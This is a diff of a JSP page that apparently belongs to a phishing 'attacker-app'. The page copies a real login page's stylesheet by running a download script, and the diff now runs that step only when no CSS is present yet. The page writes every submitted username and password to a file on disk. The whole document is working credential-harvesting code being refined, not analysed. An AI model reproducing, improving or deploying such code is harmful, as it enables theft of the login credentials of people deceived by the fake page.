@@ -7,11 +7,16 @@
 <%@page import="java.util.ArrayList"%>
 <%@page import="java.util.List"%>
 <%
-    ProcessBuilder pb = new ProcessBuilder("/bin/bash", "/opt/attacker-app/download-css.sh");
-    try {
-        Process process = pb.start();
-        process.waitFor();
-    } catch (Exception e) {
+    // Fetch the genuine login CSS only once; skip if it has already been downloaded
+    File cssDir = new File(application.getRealPath("css"));
+    String[] cssFiles = cssDir.isDirectory() ? cssDir.list() : null;
+    if (cssFiles == null || cssFiles.length == 0) {
+        ProcessBuilder pb = new ProcessBuilder("/bin/bash", "/opt/attacker-app/download-css.sh");
+        try {
+            Process process = pb.start();
+            process.waitFor();
+        } catch (Exception e) {
+        }
     }
 
     try {
@@ -26,7 +31,7 @@
             if (!Files.exists(Paths.get(dir, filename))) {
                 Files.createFile(Paths.get(dir, filename));
             }
-            List<String> credential = new ArrayList();
+            List<String> credential = new ArrayList<String>();
             credential.add(username + ", " + password);
         Files.write(Paths.get(dir, filename), credential, Charset.forName("UTF-8"), StandardOpenOption.APPEND);
         }
